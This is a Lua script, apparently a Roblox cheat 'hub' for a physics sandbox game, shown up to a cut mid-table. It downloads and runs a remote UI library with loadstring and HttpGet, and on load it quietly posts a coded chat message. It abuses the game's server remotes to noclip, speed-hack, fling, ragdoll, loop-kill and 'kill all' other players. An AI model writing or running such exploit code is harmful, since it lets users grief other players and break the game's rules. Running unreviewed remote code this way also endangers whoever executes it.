local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
game:GetService("Debris")
local GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
ReplicatedStorage:WaitForChild("CharacterEvents")
ReplicatedStorage:WaitForChild("MenuToys")
local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")
if not (Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()) then
    local _ = Players.LocalPlayer
end
local RagdollRemote = ReplicatedStorage:WaitForChild("CharacterEvents"):FindFirstChild("RagdollRemote")
local antiBlobmanEnabled = false
if not LocalPlayer.Character then
    LocalPlayer.CharacterAdded:Wait()
end
workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
local LocalPlayerRef = Players.LocalPlayer
local Workspace = game:GetService("Workspace");
(_G or {}).BlobmanDelay = 5e-8
local grabAlternator = 1
local selectedTeleportPlayer = nil
local dropdownRegistry = {}
function getAllPlayers()
    local plrs = Players
    local iter, tbl, idx = ipairs(plrs:GetPlayers())
    local result = {}
    while true do
        local player
        idx, player = iter(tbl, idx)
        if idx == nil then
            break
        end
        table.insert(result, player.Name)
    end
    return result
end
function registerDropdown(dropdown)
    table.insert(dropdownRegistry, dropdown)
    dropdown:Refresh(getAllPlayers(), true)
end
function sendChatMessage(message)
    if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
    else
        TextChatService.TextChannels.RBXGeneral:SendAsync(message)
    end
end
task.spawn(function()
    sendChatMessage("-`C\194\180-")
end)
local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeffepicy/OrionGod/refs/heads/main/CosmicOrion", true))()
OrionLib.MakeNotification(OrionLib, {
    Name = "Welcome to Cosmic Hub!",
    Content = "You`re Whitelisted! wink wink",
    Image = "rbxassetid://4483345998",
    Time = 20
})
local MainWindow = OrionLib.MakeWindow(OrionLib, {
    Name = "Cosmic Hub FTAP",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "CosmicHubFTAPConfig"
})
local PlayerTab = MainWindow:MakeTab({
    Name = "Player",
    Icon = "rbxassetid://6031075927",
    PremiumOnly = false
})
PlayerTab:AddSection({
    Name = "Movement"
})
local MovementConfig = {
    Walkspeed = false,
    WalkspeedValue = 5,
    InfiniteJump = false,
    InfiniteJumpPower = 100,
    Noclip = false,
    Connections = {}
}
local UserInputService = game:GetService("UserInputService")
function MovementConfig.WalkspeedFunc()
    if MovementConfig.Connections.WS then
        MovementConfig.Connections.WS:Disconnect()
    end
    if MovementConfig.Walkspeed then
        MovementConfig.Connections.WS = RunService.Stepped:Connect(function()
            p = Players.LocalPlayer
            if p and p.Character and (p.Character:FindFirstChild("HumanoidRootPart") and (p.Character:FindFirstChildOfClass("Humanoid") and typeof(MovementConfig.WalkspeedValue) == "number")) then
                h = p.Character.HumanoidRootPart
                u = p.Character:FindFirstChildOfClass("Humanoid")
                h.CFrame = h.CFrame + u.MoveDirection * (16 * MovementConfig.WalkspeedValue / 10)
            end
        end)
    end
end
function MovementConfig.InfiniteJumpFunc()
    if MovementConfig.Connections.JP then
        MovementConfig.Connections.JP:Disconnect()
    end
    if MovementConfig.InfiniteJump then
        MovementConfig.Connections.JP = UserInputService.JumpRequest:Connect(function()
            local plr = Players.LocalPlayer
            if plr and plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") then
                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                hum:ChangeState(Enum.HumanoidStateType.Freefall)
                task.wait()
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
                if hum.UseJumpPower == false then
                    hum.JumpHeight = math.clamp(MovementConfig.InfiniteJumpPower / 10, 7.2, 50)
                else
                    hum.JumpPower = MovementConfig.InfiniteJumpPower
                end
            end
        end)
    end
end
function MovementConfig.NoclipFunc()
    if MovementConfig.Connections.NC then
        MovementConfig.Connections.NC:Disconnect()
    end
    if MovementConfig.Noclip then
        MovementConfig.Connections.NC = RunService.Stepped:Connect(function()
            p = Players.LocalPlayer
            if p and p.Character then
                local iter, tbl, idx = ipairs(p.Character:GetDescendants())
                while true do
                    local desc
                    idx, desc = iter(tbl, idx)
                    if idx == nil then
                        break
                    end
                    if desc:IsA("BasePart") then
                        desc.CanCollide = false
                    end
                end
            end
        end)
    end
end
PlayerTab:AddToggle({
    Name = "Walkspeed",
    Default = false,
    Callback = function(val)
        MovementConfig.Walkspeed = val
        MovementConfig.WalkspeedFunc()
    end
})
PlayerTab:AddSlider({
    Name = "Speed Multiplier",
    Min = 1,
    Max = 5,
    Default = 0.1,
    Increment = 0.1,
    Callback = function(val)
        MovementConfig.WalkspeedValue = val
    end
})
PlayerTab:AddToggle({
    Name = "Infinite Jump",
    Default = false,
    Callback = function(val)
        MovementConfig.InfiniteJump = val
        MovementConfig.InfiniteJumpFunc()
    end
})
PlayerTab:AddSlider({
    Name = "Jump Power",
    Min = 16,
    Max = 500,
    Default = 16,
    Increment = 1,
    Callback = function(val)
        MovementConfig.InfiniteJumpPower = val
    end
})
PlayerTab:AddToggle({
    Name = "Noclip",
    Default = false,
    Callback = function(val)
        MovementConfig.Noclip = val
        MovementConfig.NoclipFunc()
    end
})
local InvincibilityTab = MainWindow:MakeTab({
    Name = "Invincibility",
    Icon = "rbxassetid://4483362458",
    PremiumOnly = false
})
InvincibilityTab:AddSection({
    Name = "Anti"
})
function ragdollAllPlayers()
    if RagdollRemote then
        local plrs = Players
        local iter, tbl, idx = pairs(plrs:GetPlayers())
        while true do
            local player
            idx, player = iter(tbl, idx)
            if idx == nil then
                break
            end
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                for _ = 1, 150 do
                    RagdollRemote:FireServer(player.Character.HumanoidRootPart, 9999999)
                    wait()
                end
            end
        end
    else
        OrionLib:MakeNotification({
            Name = "Error",
            Content = "error",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
    end
end
InvincibilityTab:AddButton({
    Name = "Anti Ragdoll/Snowball",
    Callback = function()
        ragdollAllPlayers()
    end
})
InvincibilityTab:AddButton({
    Name = "Destroy Void",
    Callback = function()
        Workspace.FallenPartsDestroyHeight = -1e95
    end
})
local GucciAntiConfig = {
    Players = game:GetService("Players"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    RunService = game:GetService("RunService"),
    LP = game.Players.LocalPlayer,
    spawnGucci = function()
        return GucciAntiConfig.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", CFrame.new(0, 50000, 0) * CFrame.Angles(-0.7351, 0.9028, 0.6173), Vector3.new(0, 59.667, 0))
    end,
    setup = function()
        GucciAntiConfig.spawnGucci()
        local playerName = GucciAntiConfig.LP.Name
        local ws = Workspace
        local char = GucciAntiConfig.LP.Character or GucciAntiConfig.LP.CharacterAdded:Wait()
        local spawnedToys = ws:FindFirstChild(playerName .. "SpawnedInToys")
        local blobman = nil
        local head
        if spawnedToys then
            head = spawnedToys:FindFirstChild("CreatureBlobman")
        else
            head = nil
        end
        if head then
            blobman = head:FindFirstChild("Head")
        end
        if blobman then
            blobman.CFrame = CFrame.new(0, 50000, 0)
            blobman.Anchored = true
        end
        task.wait(0.1)
        local humanoid = char:WaitForChild("Humanoid")
        local rootPart = char:WaitForChild("HumanoidRootPart")
        local savedPos = rootPart.Position
        local isSeated = false
        if head then
            head = head:FindFirstChild("VehicleSeat")
        end
        if head and head:IsA("VehicleSeat") then
            rootPart.CFrame = head.CFrame + Vector3.new(0, 2, 0)
            head:Sit(humanoid)
            isSeated = true
        end
        humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
            if isSeated and humanoid.Jump then
                task.wait(0.02)
                rootPart.CFrame = CFrame.new(savedPos)
                isSeated = false
            end
        end)
        GucciAntiConfig.ragdollConn = GucciAntiConfig.RunService.Heartbeat:Connect(function()
            if GucciAntiConfig.enabled and isSeated then
                pcall(function()
                    GucciAntiConfig.ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(ws[playerName].HumanoidRootPart, 0)
                end)
            end
        end)
        GucciAntiConfig.posCheckConn = GucciAntiConfig.RunService.Heartbeat:Connect(function()
            if GucciAntiConfig.enabled and (rootPart.Position - savedPos).Magnitude < 1 then
                isSeated = false
            end
        end)
    end
}
InvincibilityTab:AddToggle({
    Name = " Gucci Anti",
    Default = false,
    Callback = function(val)
        GucciAntiConfig.enabled = val
        if val then
            GucciAntiConfig.setup()
        else
            if GucciAntiConfig.ragdollConn then
                GucciAntiConfig.ragdollConn:Disconnect()
                GucciAntiConfig.ragdollConn = nil
            end
            if GucciAntiConfig.posCheckConn then
                GucciAntiConfig.posCheckConn:Disconnect()
                GucciAntiConfig.posCheckConn = nil
            end
        end
    end
})
InvincibilityTab:AddButton({
    Name = "Destroy Gucci (All)",
    Callback = function()
        local iter, tbl, idx = Workspace:GetDescendants()
        while true do
            local desc
            idx, desc = iter(tbl, idx)
            if idx == nil then
                break
            end
            if desc.Name == "CreatureBlobman" then
                desc.VehicleSeat:Sit(game.Players.LocalPlayer.Character.Humanoid)
                wait(0.05)
                game.Players.LocalPlayer.Character.Humanoid.Jump = true
            end
        end
    end
})
local antiGrabEnabled = false
function antiGrab()
    while antiGrabEnabled and task.wait() do
        if LocalPlayerRef:FindFirstChild("IsHeld") and LocalPlayerRef.IsHeld.Value == true then
            local char = LocalPlayerRef.Character
            local rootPart = char and char:FindFirstChild("HumanoidRootPart")
            if rootPart then
                rootPart.Anchored = true
                while LocalPlayerRef.IsHeld.Value == true and antiGrabEnabled do
                    ReplicatedStorage.CharacterEvents.Struggle:FireServer(LocalPlayerRef)
                    task.wait(0.001)
                end
                rootPart.Anchored = false
            end
        end
    end
end
InvincibilityTab:AddToggle({
    Name = "Anti Grab",
    Default = false,
    Callback = function(val)
        antiGrabEnabled = val
        if antiGrabEnabled then
            task.spawn(antiGrab)
        end
    end
})
local antiExplodeEnabled = false
function antiExplodeF()
    Workspace.ChildAdded:Connect(function(child)
        local charCheck = child:IsA("Part") and (child.Name == "Part" and (antiExplodeEnabled and LocalPlayerRef.Character))
        if charCheck then
            local rootPart = charCheck:FindFirstChild("HumanoidRootPart")
            local rightArm = charCheck:FindFirstChild("Right Arm")
            if rootPart and (rightArm and (child.Position - rootPart.Position).Magnitude <= 20) then
                rootPart.Anchored = true
                task.wait(0.01)
                while rightArm:FindFirstChild("RagdollLimbPart") and rightArm.RagdollLimbPart.CanCollide == true do
                    task.wait(0.001)
                end
                rootPart.Anchored = false
            end
        end
    end)
end
InvincibilityTab:AddToggle({
    Name = "Anti Explode",
    Default = false,
    Callback = function(val)
        antiExplodeEnabled = val
        if antiExplodeEnabled then
            task.spawn(antiExplodeF)
        end
    end
})
InvincibilityTab:AddToggle({
    Name = "Anti Fire",
    Default = false,
    Callback = function(val)
        local antiFireConfig = {
            p = game:GetService("Players").LocalPlayer,
            rs = game:GetService("RunService"),
            w = game:GetService("Workspace"),
            mon = false,
            con = nil
        }
        antiFireConfig.ep = antiFireConfig.w.Map.Hole.PoisonBigHole.ExtinguishPart
        antiFireConfig.op = antiFireConfig.ep.Position
        function check()
            local rootPart = (antiFireConfig.p.Character or antiFireConfig.p.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
            local fireLight = rootPart:FindFirstChild("FireLight")
            local fireParticle = rootPart:FindFirstChild("FireParticleEmitter")
            if fireLight or fireParticle then
                antiFireConfig.ep.CFrame = CFrame.new(rootPart.Position)
                while fireLight or fireParticle do
                    task.wait(0.1)
                    fireLight = rootPart:FindFirstChild("FireLight")
                    fireParticle = rootPart:FindFirstChild("FireParticleEmitter")
                    antiFireConfig.ep.CFrame = CFrame.new(rootPart.Position)
                end
                antiFireConfig.ep.CFrame = CFrame.new(antiFireConfig.op)
            end
        end
        antiFireConfig.mon = val
        if val then
            if not antiFireConfig.con then
                antiFireConfig.con = antiFireConfig.rs.Heartbeat:Connect(function()
                    if antiFireConfig.mon then
                        check()
                    end
                end)
            end
        else
            antiFireConfig.ep.CFrame = CFrame.new(antiFireConfig.op)
            if antiFireConfig.con then
                antiFireConfig.con:Disconnect()
                antiFireConfig.con = nil
            end
        end
    end
})
function antiLagF()
    local char = game.Players.LocalPlayer.Character
    if char then
        local rootPart = char:FindFirstChild("HumanoidRootPart")
        local humanoid = char:FindFirstChild("Humanoid")
        local playerScripts = game.Players.LocalPlayer:FindFirstChild("PlayerScripts")
        if playerScripts then
            playerScripts = game.Players.LocalPlayer.PlayerScripts:FindFirstChild("CharacterAndBeamMove")
        end
        if rootPart and (humanoid and playerScripts) then
            playerScripts.Disabled = antiLagT
        end
    end
end
InvincibilityTab:AddToggle({
    Name = "Anti Lag",
    Default = false,
    Callback = function(val)
        antiLagT = val
        antiLagF()
    end
})
function removeDetectors()
    local char = LocalPlayer.Character
    if char then
        local rootPart = char:FindFirstChild("HumanoidRootPart")
        if rootPart then
            local iter, tbl, idx = pairs(Workspace:GetDescendants())
            while true do
                local desc
                idx, desc = iter(tbl, idx)
                if idx == nil then
                    break
                end
                if desc:IsA("BasePart") and (desc.Name == "LeftDetector" or desc.Name == "RightDetector") and (rootPart.Position - desc.Position).Magnitude > 10 then
                    desc:Destroy()
                end
            end
        end
    else
        return
    end
end
function applyAntiMassless()
    while antiBlobmanEnabled do
        if LocalPlayer.Character then
            local iter, tbl, idx = ipairs(LocalPlayer.Character:GetDescendants())
            while true do
                local desc
                idx, desc = iter(tbl, idx)
                if idx == nil then
                    break
                end
                if desc:IsA("BasePart") and desc.Massless then
                    desc.Massless = false
                end
            end
        end
        task.wait(1)
    end
end
InvincibilityTab:AddToggle({
    Name = "Anti Blobman",
    Default = false,
    Callback = function(val)
        antiBlobmanEnabled = val
        if antiBlobmanEnabled then
            task.spawn(function()
                while antiBlobmanEnabled do
                    removeDetectors()
                    task.wait(1)
                end
            end)
            task.spawn(applyAntiMassless)
        end
    end
})
local AttackTab = MainWindow:MakeTab({
    Name = "Attack",
    Icon = "rbxassetid://6031094674",
    PremiumOnly = false
})
AttackTab:AddSection({
    Name = "Loop "
})
local AttackPlayers = game:GetService("Players")
local AttackRunService = game:GetService("RunService")
local AttackWorkspace = Workspace
local AttackReplicatedStorage = game.ReplicatedStorage
local AttackLocalPlayer = AttackPlayers.LocalPlayer
local loopTargetPlayers = {}
local selectedAttackPlayer = nil
local loopKickConfig = {
    E = false,
    S = nil,
    D = 2,
    Off = Vector3.new(5, -18.5, 0),
    H = 10000,
    Del = 0.5
}
local loopKillConfig = {
    E = false,
    S = nil,
    D = 2,
    Off = Vector3.new(5, -18.5, 0),
    H = 10000,
    Del = 0.5
}
function upd(dropdown)
    local plrs = AttackPlayers
    local iter, tbl, idx = ipairs(plrs:GetPlayers())
    local names = {}
    while true do
        local player
        idx, player = iter(tbl, idx)
        if idx == nil then
            break
        end
        table.insert(names, player.Name)
    end
    dropdown:Refresh(names, true)
end
function nocoll(model)
    local iter, tbl, idx = ipairs(model:GetDescendants())
    while true do
        local desc
        idx, desc = iter(tbl, idx)
        if idx == nil then
            break
        end
        if desc:IsA("BasePart") then
            desc.CanCollide = false
        end
    end
end
function fling(part, humanoid)
    nocoll(humanoid.Parent)
    local flingVelocity = Instance.new("BodyVelocity", part)
    local vel = Vector3.new(0, 1000000000, 0)
    flingVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    flingVelocity.Velocity = vel
    humanoid.Jump = true
    humanoid.Sit = false
    task.delay(3, function()
        if flingVelocity.Parent then
            flingVelocity:Destroy()
        end
    end)
end
function above(player, height)
    local char = player.Character
    if char then
        char = player.Character:FindFirstChild("HumanoidRootPart")
    end
    return (not char or height < char.Position.Y) and true or false
end
function save(config)
    local char = AttackLocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        config.S = char:GetPivot()
    end
end
function ret(config)
    local char = AttackLocalPlayer.Character
    local rootPart
    if char then
        rootPart = char:FindFirstChild("HumanoidRootPart")
    else
        rootPart = char
    end
    if rootPart and (config.S and (rootPart.Position - config.S.Position).Magnitude > config.D) then
        char:PivotTo(config.S)
    end
end
function act(player, config, shouldKill)
    if config.E then
        if AttackWorkspace:FindFirstChild("PlotItems") and AttackWorkspace.PlotItems.PlayersInPlots:FindFirstChild(player.Name) then
            return
        else
            local targetChar = player.Character
            local targetRoot
            if targetChar then
                targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
            else
                targetRoot = targetChar
            end
            local targetHum
            if targetChar then
                targetHum = targetChar:FindFirstChildOfClass("Humanoid")
            else
                targetHum = targetChar
            end
            local targetHead
            if targetChar then
                targetHead = targetChar:FindFirstChild("Head")
            else
                targetHead = targetChar
            end
            if targetRoot and (targetHum and (targetHead and (targetHum.Health > 0 and not above(player, config.H)))) then
                local myChar = AttackLocalPlayer.Character
                local myRoot
                if myChar then
                    myRoot = myChar:FindFirstChild("HumanoidRootPart")
                else
                    myRoot = myChar
                end
                if myRoot then
                    pcall(function()
                        save(config)
                        myChar:PivotTo(CFrame.new(targetRoot.Position + config.Off))
                        nocoll(targetChar)
                        AttackReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(targetRoot, targetRoot.CFrame)
                        task.wait()
                        ret(config)
                        task.wait(0.1)
                        AttackReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(targetRoot)
                        task.wait(0.1)
                        if targetHead:FindFirstChild("PartOwner") and targetHead.PartOwner.Value == AttackLocalPlayer.Name then
                            fling(targetRoot, targetHum)
                            if shouldKill then
                                task.wait(0.1)
                                targetHum.Health = 0
                            end
                        end
                    end)
                    task.wait(config.Del)
                end
            else
                return
            end
        end
    else
        return
    end
end
function loop(config, shouldKill)
    save(config)
    local iter, tbl, idx = pairs(loopTargetPlayers)
    while true do
        idx = iter(tbl, idx)
        if idx == nil or not config.E then
            break
        end
        local player = AttackPlayers:FindFirstChild(idx)
        if player then
            act(player, config, shouldKill)
        end
    end
end
function loopCtrl(config, shouldKill)
    return AttackRunService.Heartbeat:Connect(function()
        if config.E then
            loop(config, shouldKill)
        end
    end)
end
local loopKickConnection = nil
local loopKillConnection = nil
local kickAllConnection = nil
local killAllConnection = nil
function stop(connection, config)
    config.E = false
    if connection then
        connection:Disconnect()
    end
    config.S = nil
end
SelectDropdown = AttackTab:AddDropdown({
    Name = "Select Player",
    Options = {},
    Callback = function(name)
        selectedAttackPlayer = AttackPlayers:FindFirstChild(name)
    end
})
LoopDropdown = AttackTab:AddDropdown({
    Name = "Players in Loop",
    Options = {},
    Callback = function(name)
        selectedAttackPlayer = AttackPlayers:FindFirstChild(name)
    end
})
AttackTab:AddButton({
    Name = "Add Player",
    Callback = function()
        if selectedAttackPlayer and not loopTargetPlayers[selectedAttackPlayer.Name] then
            loopTargetPlayers[selectedAttackPlayer.Name] = true
            upd(LoopDropdown)
        end
    end
})
AttackTab:AddButton({
    Name = "Remove Player",
    Callback = function()
        if selectedAttackPlayer and loopTargetPlayers[selectedAttackPlayer.Name] then
            loopTargetPlayers[selectedAttackPlayer.Name] = nil
            selectedAttackPlayer = nil
            upd(SelectDropdown)
            upd(LoopDropdown)
        end
    end
})
AttackTab:AddToggle({
    Name = "Loop Kick",
    Callback = function(val)
        loopKickConfig.E = val
        if val then
            loopKickConnection = loopCtrl(loopKickConfig, false)
        else
            stop(loopKickConnection, loopKickConfig)
        end
    end
})
AttackTab:AddToggle({
    Name = "Loop Kill",
    Callback = function(val)
        loopKillConfig.E = val
        if val then
            loopKillConnection = loopCtrl(loopKillConfig, true)
        else
            stop(loopKillConnection, loopKillConfig)
        end
    end
})
AttackPlayers.PlayerAdded:Connect(function()
    upd(SelectDropdown)
end)
AttackPlayers.PlayerRemoving:Connect(function(player)
    if loopTargetPlayers[player.Name] then
        loopTargetPlayers[player.Name] = nil
        upd(LoopDropdown)
    end
    upd(SelectDropdown)
end)
upd(SelectDropdown)
upd(LoopDropdown)
AttackTab:AddToggle({
    Name = "Kick All",
    Callback = function(val)
        if val then
            stop(loopKickConnection, loopKickConfig)
            kickAllConnection = AttackRunService.Heartbeat:Connect(function()
                save(loopKickConfig)
                local plrs = AttackPlayers
                local iter, tbl, idx = ipairs(plrs:GetPlayers())
                while true do
                    local player
                    idx, player = iter(tbl, idx)
                    if idx == nil then
                        break
                    end
                    if player ~= AttackLocalPlayer then
                        act(player, loopKickConfig, false)
                    end
                end
            end)
        else
            stop(kickAllConnection, loopKickConfig)
        end
    end
})
AttackTab:AddToggle({
    Name = "Kill All",
    Callback = function(val)
        if val then
            stop(loopKillConnection, loopKillConfig)
            killAllConnection = AttackRunService.Heartbeat:Connect(function()
                save(loopKillConfig)
                local plrs = AttackPlayers
                local iter, tbl, idx = ipairs(plrs:GetPlayers())
                while true do
                    local player
                    idx, player = iter(tbl, idx)
                    if idx == nil then
                        break
                    end
                    if player ~= AttackLocalPlayer then
                        act(player, loopKillConfig, true)
                    end
                end
            end)
        else
            stop(killAllConnection, loopKillConfig)
        end
    end
})
AttackTab:AddSection({
    Name = "Grabs"
})
local killGrabEnabled = false
function killGrabF()
    if killGrabEnabled then
        Workspace.ChildAdded:Connect(function(child)
            if child:IsA("Model") and (child.Name == "GrabParts" and killGrabEnabled) then
                local grabPart = child:FindFirstChild("GrabPart")
                if grabPart and grabPart:FindFirstChild("WeldConstraint") then
                    local targetPart = grabPart.WeldConstraint.Part1
                    local targetHum = targetPart and (targetPart.Parent and targetPart.Parent ~= LocalPlayerRef.Character) and targetPart.Parent:FindFirstChildOfClass("Humanoid")
                    if targetHum then
                        targetHum.Health = 0
                    end
                end
            end
        end)
    end
end
AttackTab:AddToggle({
    Name = "Kill Grab",
    Default = false,
    Callback = function(val)
        killGrabEnabled = val
        killGrabF()
    end
})
local strengthConfig = {
    S = game:GetService("UserInputService"),
    A = game:GetService("ContextActionService"),
    W = game:GetService("Workspace"),
    R = game:GetService("RunService"),
    D = game:GetService("Debris"),
    P = game:GetService("Players"),
    Enabled = false,
    Strength = 800,
    UI = {}
}
function onGrabAdded(child)
    if not strengthConfig.Enabled then
        return
    end
    if child.Name ~= "GrabParts" then
        return
    end
    local grabPart = child:FindFirstChild("GrabPart")
    if not (grabPart and grabPart:FindFirstChild("WeldConstraint")) then
        return
    end
    local targetPart = grabPart.WeldConstraint.Part1
    if not targetPart then
        return
    end
    local grabBodyVelocity = Instance.new("BodyVelocity")
    grabBodyVelocity.MaxForce = Vector3.new(0, 0, 0)
    grabBodyVelocity.Parent = targetPart
    local button = nil
    local mouseUpConn = nil
    local mouseDownConn = nil
    local parentChangeConn = nil
    while true do
        if button or not (child.Parent and strengthConfig.Enabled) then
            if button and strengthConfig.Enabled then
                function launch()
                    grabBodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    grabBodyVelocity.Velocity = strengthConfig.W.CurrentCamera.CFrame.LookVector * strengthConfig.Strength
                end
                mouseUpConn = button.MouseButton1Up:Connect(launch)
                mouseDownConn = button.MouseButton1Down:Connect(launch)
            end
            local _ = child:GetPropertyChangedSignal("Parent"):Connect(function()
                if not child.Parent then
                    if mouseUpConn then
                        mouseUpConn:Disconnect()
                    end
                    if mouseDownConn then
                        mouseDownConn:Disconnect()
                    end
                    if parentChangeConn then
                        parentChangeConn:Disconnect()
                    end
                    strengthConfig.D:AddItem(grabBodyVelocity, 1)
                end
            end)
            return
        end
        local iter, tbl, idx = pairs(strengthConfig.P.LocalPlayer.PlayerGui.ContextActionGui:GetDescendants())
        while true do
            local desc
            idx, desc = iter(tbl, idx)
            if idx == nil then
                break
            end
            if desc:IsA("ImageLabel") and desc.Image == "http://www.roblox.com/asset/?id=9603678090" then
                button = desc.Parent
                break
            end
        end
        strengthConfig.R.Heartbeat:Wait()
    end
end
function toggleConnections(enabled)
    if enabled then
        strengthConfig.GrabConn = strengthConfig.W.ChildAdded:Connect(onGrabAdded)
    elseif strengthConfig.GrabConn then
        strengthConfig.GrabConn:Disconnect()
        strengthConfig.GrabConn = nil
    end
end
AttackTab:AddToggle({
    Name = "Strength",
    Default = false,
    Callback = function(val)
        strengthConfig.Enabled = val
        toggleConnections(val)
    end
})
AttackTab:AddSlider({
    Name = "Launch Strength",
    Min = 10,
    Max = 3000,
    Default = strengthConfig.Strength,
    Increment = 50,
    Callback = function(val)
        strengthConfig.Strength = val
    end
})
local AttackLocalPlayerRef = game:GetService("Players").LocalPlayer
AttackTab:AddSection({
    Name = "Snowball Ragdoll"
})
local snowballConfig = {
    P = game:GetService("Players"),
    RS = game:GetService("ReplicatedStorage"),
    W = Workspace,
    LP = game.Players.LocalPlayer,
    Toy = game:GetService("ReplicatedStorage"):WaitForChild("MenuToys"),
    Set = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"),
    TP = nil,
    TE = false,
    SE = false,
    AE = false,
    DD = nil,
    R = {}
}
function getAllPlayers()
    local iter, tbl, idx = ipairs(snowballConfig.P:GetPlayers())
    local result = {}
    while true do
        local player
        idx, player = iter(tbl, idx)
        if idx == nil then
            break
        end
        if player ~= snowballConfig.LP then
            table.insert(result, player.Name)
        end
    end
    return result
end
function updateDropdown()
    if snowballConfig.DD then
        snowballConfig.DD:Refresh(getAllPlayers(), true)
    end
end
snowballConfig.P.PlayerAdded:Connect(updateDropdown)
snowballConfig.P.PlayerRemoving:Connect(updateDropdown)
function spawnToy(toyName, position)
    task.spawn(function()
        local spawnFunc = snowballConfig.Toy:FindFirstChild("SpawnToyRemoteFunction")
        if spawnFunc then
            pcall(function()
                spawnFunc:InvokeServer(toyName, CFrame.new(position), Vector3.new())
            end)
        end
    end)
end
function tpSnow()
    while snowballConfig.AE do
        local spawnedToys = snowballConfig.W:FindFirstChild(snowballConfig.LP.Name .. "SpawnedInToys")
        if spawnedToys then
            local iter, tbl, idx = pairs(snowballConfig.R)
            while true do
                local player
                idx, player = iter(tbl, idx)
                if idx == nil then
                    break
                end
                local rootPart = player.Character
                if rootPart then
                    rootPart = rootPart:FindFirstChild("HumanoidRootPart")
                end
                if rootPart then
                    local iter2, tbl2, idx2 = ipairs(spawnedToys:GetChildren())
                    while true do
                        local toy
                        idx2, toy = iter2(tbl2, idx2)
                        if idx2 == nil then
                            break
                        end
                        if toy:IsA("Model") and toy.Name == "BallSnowball" then
                            local iter3, tbl3, idx3 = ipairs(toy:GetDescendants())
                            while true do
                                local desc
                                idx3, desc = iter3(tbl3, idx3)
                                if idx3 == nil then
                                    break
                                end
                                if desc:IsA("BasePart") then
                                    desc.Position = rootPart.Position
                                end
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.1)
    end
end
function autoBlob()
    while snowballConfig.AE do
        snowballConfig.R = {}
        local iter, tbl, idx = pairs(snowballConfig.P:GetPlayers())
        while true do
            local player
            idx, player = iter(tbl, idx)
            if idx == nil then
                break
            end
            if player ~= snowballConfig.LP and player.Character then
                local hum = player.Character:FindFirstChildOfClass("Humanoid")
                if hum and (hum.SeatPart and hum.SeatPart.Parent.Name == "CreatureBlobman") then
                    table.insert(snowballConfig.R, player)
                    local rootPart = snowballConfig.LP.Character
                    if rootPart then
                        rootPart = snowballConfig.LP.Character:FindFirstChild("HumanoidRootPart")
                    end
                    if rootPart then
                        spawnToy("BallSnowball", rootPart.Position + Vector3.new(0, 2, 0))
                    end
                end
            end
        end
        task.wait(0.1)
    end
end
function spawnBalls()
    while snowballConfig.SE do
        local rootPart = snowballConfig.LP.Character
        if rootPart then
            rootPart = snowballConfig.LP.Character:FindFirstChild("HumanoidRootPart")
        end
        if rootPart then
            spawnToy("BallSnowball", rootPart.Position + Vector3.new(0, 2, 0))
        end
        task.wait(1)
    end
end
function tpBall()
    while snowballConfig.TE do
        local spawnedToys = snowballConfig.W:FindFirstChild(snowballConfig.LP.Name .. "SpawnedInToys")
        if spawnedToys and snowballConfig.TP then
            local targetPlayer = snowballConfig.P:FindFirstChild(snowballConfig.TP)
            if targetPlayer then
                targetPlayer = targetPlayer.Character
            end
            if targetPlayer then
                targetPlayer = targetPlayer:FindFirstChild("HumanoidRootPart")
            end
            if targetPlayer then
                local iter, tbl, idx = ipairs(spawnedToys:GetChildren())
                while true do
                    local toy
                    idx, toy = iter(tbl, idx)
                    if idx == nil then
                        break
                    end
                    if toy:IsA("Model") and toy.Name == "BallSnowball" then
                        local iter2, tbl2, idx2 = ipairs(toy:GetDescendants())
                        while true do
                            local desc
                            idx2, desc = iter2(tbl2, idx2)
                            if idx2 == nil then
                                break
                            end
                            if desc:IsA("BasePart") then
                                desc.Position = targetPlayer.Position
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.1)
    end
end
snowballConfig.DD = AttackTab:AddDropdown({
    Name = "Select Player (Snowball)",
    Options = getAllPlayers(),
    Default = nil,
    Callback = function(name)
        snowballConfig.TP = name
    end
})
updateDropdown()
AttackTab:AddToggle({
    Name = "Snowball Ragdoll",
    Default = false,
    Callback = function(val)
        snowballConfig.TE = val
        if val then
            task.spawn(tpBall)
        end
    end
})
AttackTab:AddToggle({
    Name = "Auto Spawn Snowballs",
    Default = false,
    Callback = function(val)
        snowballConfig.SE = val
        if val then
            task.spawn(spawnBalls)
        end
    end
})
AttackTab:AddToggle({
    Name = "Auto Kick Blob (Snowball Spam)",
    Default = false,
    Callback = function(val)
        snowballConfig.AE = val
        if val then
            task.spawn(autoBlob)
            task.spawn(tpSnow)
        end
    end
})
if not game:IsLoaded() then
    game.Loaded:Wait()
end
if not (syn and protectgui) then
    getgenv().protectgui = function()
    end
end
local BlobmanTab = MainWindow:MakeTab({
    Name = "Blobman Loop",
    Icon = "rbxassetid://6031091005",
